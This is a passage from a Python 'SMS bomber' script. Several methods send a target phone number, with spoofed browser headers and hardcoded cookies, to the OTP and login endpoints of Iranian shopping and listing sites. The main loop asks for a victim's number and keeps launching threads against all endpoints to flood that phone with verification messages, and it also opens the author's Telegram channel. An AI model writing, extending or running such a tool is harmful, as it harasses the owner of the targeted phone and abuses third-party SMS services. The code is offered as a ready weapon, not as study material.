            headers = {'Connection': 'keep-alive','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','Accept': 'application/json, text/javascript, */*; q=0.01','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua-mobile': '?0', 'User-Agent': choice(self.u_a), 'sec-ch-ua-platform': '"Windows"','Origin': 'https://www.markazeahan.com', 'Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://www.markazeahan.com/my-account/', 'Accept-Language': 'en-US,en;q=0.9',}
            req77 = requests.post('https://www.markazeahan.com/wp-admin/admin-ajax.php', headers=headers, cookies=cookies,data={'ep':"98"+ self.number,'otp': '','action': 'request_get_otp',})
            if req77.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_78(self):
        try:
            cookies = {'PHPSESSID': '25b3112a6657b6be8a22307ba8c150ee','analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}','analytics_token': '41562f24-c190-bcec-dcfd-0229ef2940d6','analytics_session_token': 'a4cd3b51-968e-fa12-9acc-9e8571a529ef','yektanet_session_last_activity': '3/29/2022','_yngt_iframe': '1','_ga_DQP0SDQDDZ': 'GS1.1.1648569041.1.0.1648569041.0','_ga_DPS7CEXFPW': 'GS1.1.1648569041.1.0.1648569041.0','_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce','_ga': 'GA1.2.1849809716.1648569041','_gid': 'GA1.2.994141476.1648569042','_gat_UA-213351030-1': '1','_gat_gtag_UA_104149147_4': '1',}
            headers = {'Connection': 'keep-alive', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"' ,'Accept': '*/*', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-Requested-With': 'XMLHttpRequest','sec-ch-ua-mobile': '?0', 'User-Agent': choice(self.u_a),'sec-ch-ua-platform': '"Windows"','Origin': 'https://measomarket.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty','Referer': 'https://measomarket.com/','Accept-Language': 'en-US,en;q=0.9',}        
            req78 = requests.post('https://measomarket.com/admin/functions/ajax-auth-login.php', headers=headers,cookies=cookies, data={'loginMobile': "+98"+self.number,})
            if req78.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_79(self):
        try:
            cookies = {'crisp-client%2Fsession%2F782f5102-b860-4523-a797-26b82d44cda8': 'session_6e6353c1-bc8b-45ea-9a70-3916f7cf4ff1',}
            headers = {'Connection': 'keep-alive', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','Accept': '*/*','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua-mobile': '?0','User-Agent': choice(self.u_a),'sec-ch-ua-platform': '"Windows"', 'Origin': 'https://khoosheonline.ir', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://khoosheonline.ir/%D8%B9%D8%B6%D9%88%DB%8C%D8%AA/', 'Accept-Language': 'en-US,en;q=0.9',}
            req79 = requests.post('https://khoosheonline.ir/wp-admin/admin-ajax.php', headers=headers, cookies=cookies,data={'action': 'send_sms_url_ud','phone': "+98"+self.number})
            if req79.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass
    def send_80(self):
        try:
            headers = {'authority': 'api.shabesh.com','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','accept': 'application/json','content-type': 'application/json; charset=utf-8', 'sec-ch-ua-mobile': '?0','user-agent': choice(self.u_a),'sec-ch-ua-platform': '"Windows"','origin': 'https://shabesh.com', 'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty','referer': 'https://shabesh.com/','accept-language': 'en-US,en;q=0.9',}
            req80 = requests.post('https://api.shabesh.com/api/checknumber', headers=headers, json={"mobile": number})
            if req80.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass

    def send_81(self):
        try:
            cookies = {'analytics_campaign': '{%22source%22:%22direct%22%2C%22medium%22:null}','analytics_token': '2a8dc68c-80bd-5cb0-5462-36acfdd75ba9','analytics_session_token': '06005162-e694-3790-1ef8-bb062855561b','yektanet_session_last_activity': '3/29/2022', '_yngt_iframe': '1','_yngt': '31f33bf3-36005-5f720-06764-4d720f2d761ce','Reserve': '1648568429660','Cart': 'cart_1648568429670','Time': '1648568429670','saveCart': 'Off',}
            headers = {'authority': 'ahvazland.com', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"','accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','x-requested-with': 'XMLHttpRequest', 'sec-ch-ua-mobile': '?0','user-agent': choice(self.u_a),'sec-ch-ua-platform': '"Windows"','origin': 'https://ahvazland.com', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty','referer': 'https://ahvazland.com/account','accept-language': 'en-US,en;q=0.9',}
            req81 = requests.post('https://ahvazland.com/user/verification', headers=headers, cookies=cookies, data={'mobile': number,'jquery_load': '1',})
            if req81.status_code == 200:
                self.count_ok += 1
            else:
                self.count_er += 1
        except:
            pass


print(f'''
{C.YELLOW}+{C.WHITE}---------------------------{C.YELLOW}+
{C.CYAN}|{C.GREEN}                         {C.CYAN}  |
{C.CYAN}|{C.GREEN} Python {C.RED}v3  {C.CYAN}               |
{C.CYAN}|{C.GREEN}                         {C.CYAN}  |
{C.CYAN}|{C.GREEN} Me:{C.RED} t.me//e_l_f_6_6_6{C.CYAN}     |
{C.CYAN}|{C.GREEN}                         {C.CYAN}  |
{C.CYAN}|{C.GREEN} t.me//Elf_security_cyber{C.CYAN}  |
{C.CYAN}|{C.GREEN}                         {C.CYAN}  |
{C.YELLOW}+{C.WHITE}---------------------------{C.YELLOW}+
\n''')

phone = input(f'{C.WHITE}[{C.YELLOW} DATA {C.WHITE}]{C.LIGHTGREEN_EX} Enter The Number Phone {C.LIGHTCYAN_EX}[9000000000] --> {C.YELLOW}')

ELF = sms_bomber(phone , f'''{C.RED}runnig script sms bomber plaese with..!''')
os.system('cls' or 'clear')
ELF.print_()
if os.name == 'nt':
    os.system('cls')
    os.system('start https://t.me/Elf_security_cyber')
else:
    os.system('clear')
    os.system('xdg-open https://t.me/Elf_security_cyber')
time.sleep(0.3)    
ELF.user_agent()
time.sleep(3)
while True:
    try:
        for i in range(1 , 81):
            exec(f'threading.Thread(target=ELF.send_{str(i)}).start()')
        threading.Thread(target=ELF.counts).start()
    except KeyboardInterrupt() :
       os.system('cls' or 'clear')
       print(f'{C.WHITE}[{C.GREEN} INFO {C.WHITE}]{C.LIGHTGREEN_EX} Stop Spam..!\n{C.WHITE}[{C.GREEN} INFO {C.WHITE}]{C.LIGHTGREEN_EX} Good Bye')
       break
    except:
       os.system('cls' or 'clear')
       print(f'{C.WHITE}[{C.GREEN} INFO {C.WHITE}]{C.LIGHTGREEN_EX} Stop Spam..!\n{C.WHITE}[{C.GREEN} INFO {C.WHITE}]{C.LIGHTGREEN_EX} Good Bye')
       break
